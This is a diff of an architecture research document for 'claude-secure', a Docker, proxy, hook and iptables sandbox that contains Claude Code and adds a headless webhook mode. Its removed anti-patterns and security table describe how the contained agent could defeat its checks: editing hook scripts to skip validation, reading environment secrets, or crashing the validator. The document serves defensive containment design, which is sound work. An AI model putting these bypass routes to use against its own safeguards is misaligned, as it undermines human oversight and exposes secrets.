-| host -> containers | Docker volumes (read-only mounts) | Config, hooks, secrets mounted into containers | Root-owned files prevent modification from inside containers |
+The webhook listener communicates with Docker only through the Docker CLI. It never connects to any container over a network socket directly.
 
 ## Anti-Patterns
 
-### Anti-Pattern 1: Fail-Open on Validator Errors
+### Anti-Pattern 1: Running Claude Agent SDK Directly on Host
 
-**What people do:** If the validator HTTP server is unreachable or returns an error, allow the tool call anyway to avoid blocking the user.
-**Why it's wrong:** An attacker (or a bug) that crashes the validator gains unrestricted network access. The entire security model collapses.
-**Do this instead:** Fail-closed. If the hook cannot register with the validator, exit 2 (block). If the validator cannot check iptables, drop the packet. User restarts the service to recover.
+**What people do:** Import `claude-agent-sdk` in the webhook listener and call `query()` directly.
+**Why it's wrong:** Completely bypasses Docker isolation, hooks, proxy redaction, and iptables validation. Claude runs on the host with full network access. Secrets are sent to Anthropic unredacted.
+**Do this instead:** Always use `docker compose exec -T claude claude -p ...` to keep Claude inside the security boundary.
 
-### Anti-Pattern 2: Storing Secrets in Container Environment Variables
+### Anti-Pattern 2: Persistent Headless Containers
 
-**What people do:** Pass secrets via Docker environment variables (visible in `docker inspect`, process listing, `/proc/*/environ`).
-**Why it's wrong:** Claude Code runs inside the container and could read `/proc/self/environ` or the environment directly, exposing secrets to the LLM context.
-**Do this instead:** Secrets live only in `config/.env` mounted read-only into proxy/validator. The claude container gets only `ANTHROPIC_BASE_URL` and auth tokens (which the proxy handles). The `ANTHROPIC_API_KEY` in the claude container is a dummy or the user's own key -- the proxy replaces it with the real one when forwarding.
+**What people do:** Keep Docker Compose containers running between webhook events for faster response.
+**Why it's wrong:** State leakage between tasks (workspace files, SQLite entries, env contamination). Different events may need different profiles.
+**Do this instead:** Ephemeral instances. The ~10-15s startup cost is acceptable for webhook tasks that take 30-300 seconds anyway.
 
-### Anti-Pattern 3: Mutable Hook Scripts
+### Anti-Pattern 3: Webhook Listener Inside Docker
 
-**What people do:** Mount hook scripts as regular volumes, owned by the container user.
-**Why it's wrong:** Claude Code could modify the hook script to skip validation, register fake call-IDs, or disable blocking entirely.
-**Do this instead:** Hooks are root-owned (`chmod 555`), mounted read-only (`:ro`), and the container drops all capabilities (`cap_drop: ALL`) with `no-new-privileges: true`. Claude can execute hooks but cannot modify them.
+**What people do:** Add the listener as a Docker Compose service.
+**Why it's wrong:** The listener needs to orchestrate Docker Compose (start/exec/stop other instances). Docker-in-Docker or socket mounting adds complexity and attack surface. The listener also needs host access to profile configs and docs repos.
+**Do this instead:** Run the listener as a systemd user service on the host.
 
-### Anti-Pattern 4: Streaming Proxy Without Full-Body Inspection
+### Anti-Pattern 4: Using -it Flags for Headless Exec
 
-**What people do:** Forward SSE chunks as they arrive for lower latency, performing string replacement on each chunk.
-**Why it's wrong:** A secret value could be split across two chunks (e.g., `ghp_xxxx` in one chunk, `xxxxxxxx` in the next). Per-chunk replacement would miss it.
-**Do this instead:** Phase 1 uses buffered mode (read entire body, replace, forward). Phase 2 streaming must implement a sliding window or buffer-then-flush approach with overlap detection.
+**What people do:** Copy the interactive `docker compose exec -it claude claude ...` pattern for headless.
+**Why it's wrong:** `-it` allocates a TTY and interactive stdin. In systemd/background context, there is no TTY, causing "input device is not a TTY" errors.
+**Do this instead:** Use `docker compose exec -T` (no TTY, no stdin). This is critical and easy to miss.
 
-### Anti-Pattern 5: Single SQLite Connection Across Threads
+### Anti-Pattern 5: --dangerously-skip-permissions Without --allowedTools
 
-**What people do:** Share one `sqlite3.Connection` across the HTTP server thread and the cleanup thread.
-**Why it's wrong:** SQLite connections are not thread-safe by default. Concurrent writes cause `database is locked` errors.
-**Do this instead:** Create a new connection per request/operation, or use `check_same_thread=False` with a threading lock around all database operations.
+**What people do:** Use `--dangerously-skip-permissions` and rely solely on claude-secure's hook for security.
+**Why it's wrong:** While the hook enforces domain whitelisting, defense-in-depth requires also restricting which tools are available. Some headless tasks (review, analysis) should not have Bash access at all.
+**Do this instead:** Always pair with explicit `--allowedTools` per profile. Read-only tasks use `"Read,Glob,Grep"`. Full tasks use `"Bash,Read,Write,Edit,Glob,Grep,WebSearch,WebFetch"`.
 
-## Build Order (Dependency Graph)
-
-The components have clear dependency ordering based on what needs to exist for other parts to function:
+## Recommended Project Structure (v2.0 additions)
 
 ```
-Phase 1: Foundation
-  Step 1: Docker Compose + Networks (claude-internal, claude-external)
-           No dependencies. This is the infrastructure skeleton.
+claude-secure/
+  (existing -- unchanged)
+  bin/claude-secure              # MODIFIED: add --profile, --headless
+  docker-compose.yml             # UNCHANGED
+  proxy/                         # UNCHANGED
+  validator/                     # UNCHANGED
+  claude/                        # UNCHANGED
+  config/                        # UNCHANGED
+  tests/                         # UNCHANGED (add new test scripts)
+  install.sh                     # MINOR: optionally install systemd service
 
-  Step 2: Validator container (Python HTTP + SQLite + iptables)
-           Depends on: networks exist
-           Why first: both hook and proxy need validator to be running.
-           Can be tested independently with curl.
+  (new)
+  listener/
+    server.js                    # Webhook HTTP server (Node.js stdlib)
+    handlers/
+      dispatch.sh                # Event routing + profile lookup
+    report.sh                    # JSON parse + report format + git push
+    systemd/
+      claude-webhook.service     # systemd user unit file
+    config.example.json          # Example: port, webhook secret, concurrency
 
-  Step 3: Proxy container (Node.js HTTP with secret redaction)
-           Depends on: networks exist, config/whitelist.json, config/.env
-           Why second: Claude needs proxy to talk to Anthropic.
-           Can be tested independently with curl against a mock upstream.
-
-  Step 4: Claude container + hooks
-           Depends on: proxy running, validator running, hooks written
-           Why last: it consumes both proxy and validator services.
-           Hooks can be developed and unit-tested before containerization.
-
-  Step 5: Integration testing
-           Depends on: all containers running
-           End-to-end tests for blocked/allowed/redacted scenarios.
-
-  Step 6: Installer script
-           Depends on: all containers working together
-           Wraps the setup into a single command.
+  profiles/
+    example-service/             # Example profile (shipped in repo)
+      whitelist.json
+      env.example                # Example .env (no real secrets)
+      config.sh
+      prompt-templates/
+        issue.md
+        push.md
+        ci-failure.md
+    repo-map.example.json        # Example repo-to-profile mapping
 ```
 
-### Build Order Rationale
+## Suggested Build Order
 
-- **Validator first** because it is the most self-contained component (HTTP server + SQLite) and can be tested in isolation. It has no upstream dependencies.
-- **Proxy second** because it needs only outbound HTTPS access (which it has via `claude-external` network) and config files. Testing it requires only curl and a valid Anthropic API key.
-- **Claude container last** because it depends on both proxy and validator being functional. The hook scripts can be developed alongside the validator (they call its API), but the full integration only works when all three services are up.
-- **Installer last** because it wraps a working system. Building installer before the system works leads to premature abstraction and constant installer rework.
+Based on dependency analysis, build bottom-up:
 
-## Scaling Considerations
+| Order | Component | Depends On | Can Test With |
+|-------|-----------|------------|---------------|
+| 1 | Profile system | Nothing | Use profiles for interactive sessions |
+| 2 | Headless CLI path | Profiles | `claude-secure --profile test --headless "echo hello"` |
+| 3 | Report writer | Headless CLI output | Captured JSON from step 2 |
+| 4 | Webhook listener | Nothing (independent) | `curl -X POST` with test payloads |
+| 5 | Event handlers + templates | Profiles + listener | Webhook -> profile -> prompt (dry run) |
+| 6 | Integration + lifecycle | All above | End-to-end: webhook -> headless -> report |
 
-This system is designed for a single developer workstation. Scaling is not a primary concern, but these are the practical limits:
-
-| Concern | Single User (target) | Multiple Projects |
-|---------|---------------------|-------------------|
-| Container count | 3 containers, ~200MB total memory | One set per project (Phase 3) |
-| SQLite throughput | <1 write/second (call registration) | No issue even with 10 projects |
-| Proxy latency | ~50-200ms overhead per Anthropic call (buffered mode) | Acceptable for interactive CLI use |
-| iptables rules | <10 rules | Could grow with many whitelisted domains; manageable |
-
-### Practical Limits
-
-1. **First bottleneck:** Proxy buffering latency on large responses. Anthropic responses for code generation can be 50KB+. Buffering adds latency proportional to response size. For Phase 1 this is acceptable. Phase 2 streaming addresses it.
-2. **Second bottleneck:** SQLite write contention if multiple tool calls fire rapidly. Unlikely with single-user CLI usage, but the cleanup thread and registration handler should use separate connections with proper locking.
-
-## Security Model Summary
-
-```
-Layer    | What it prevents                          | Bypass scenario
----------|-------------------------------------------|---------------------------
-Docker   | Direct internet from claude container     | Container escape (Docker vuln)
-Hook     | Unauthorized tool calls to external URLs   | Hook script modification (mitigated by root ownership)
-Proxy    | Secrets reaching Anthropic servers         | Secret in unexpected encoding, split across chunks
-Validator| Network calls without hook authorization   | Validator crash (fail-closed mitigates)
-iptables | All unauthorized outbound from claude      | NET_ADMIN escalation in claude container (mitigated by cap_drop: ALL)
-```
+**Rationale:** Profiles first because everything else depends on them. Headless CLI second because it is the core integration point and can be tested manually. Listener can be developed in parallel with steps 2-3 since it is independent until integration. Report writer is simple (jq + git) but depends on knowing the JSON output format from step 2.
 
 ## Sources
 
-- Docker Compose networking documentation: `internal: true` network flag removes the default gateway, preventing internet access (Docker official docs, well-established behavior since Compose v2)
-- Claude Code hooks: PreToolUse hook mechanism receives tool name and input as JSON on stdin, uses exit codes 0/1/2 for allow/error/block (Anthropic Claude Code documentation)
-- SQLite threading: connections are not thread-safe unless `check_same_thread=False` is used with external locking (SQLite documentation)
-- iptables in Docker: containers with `NET_ADMIN` capability can manage their own iptables rules within their network namespace (Docker security documentation)
-- Project specification: `/home/igor9000/claude-secure/Project.md` (primary architecture source)
+- [Claude Code headless documentation](https://code.claude.com/docs/en/headless) -- HIGH confidence, official Anthropic docs. Confirms `-p`, `--output-format json`, `--bare`, `--allowedTools`, `--max-turns`, `--max-budget-usd`, `--no-session-persistence` flags.
+- [Claude Code CLI reference](https://code.claude.com/docs/en/cli-reference) -- HIGH confidence, official. Complete flag inventory including `--dangerously-skip-permissions`, `--append-system-prompt`, `--permission-mode`.
+- [Claude Agent SDK overview](https://code.claude.com/docs/en/agent-sdk/overview) -- HIGH confidence, official. Confirms SDK is for direct programmatic use (NOT appropriate for claude-secure's architecture where Docker isolation is required).
+- [adnanh/webhook](https://github.com/adnanh/webhook) -- Reference for webhook server + systemd integration patterns.
+- Existing claude-secure codebase (`docker-compose.yml`, `bin/claude-secure`, `pre-tool-use.sh`, `install.sh`) -- HIGH confidence, primary source for integration point analysis.
 
 ---
-*Architecture research for: Docker-based CLI security isolation*
-*Researched: 2026-04-08*
+*Architecture research for: claude-secure v2.0 headless agent mode*
+*Researched: 2026-04-11*
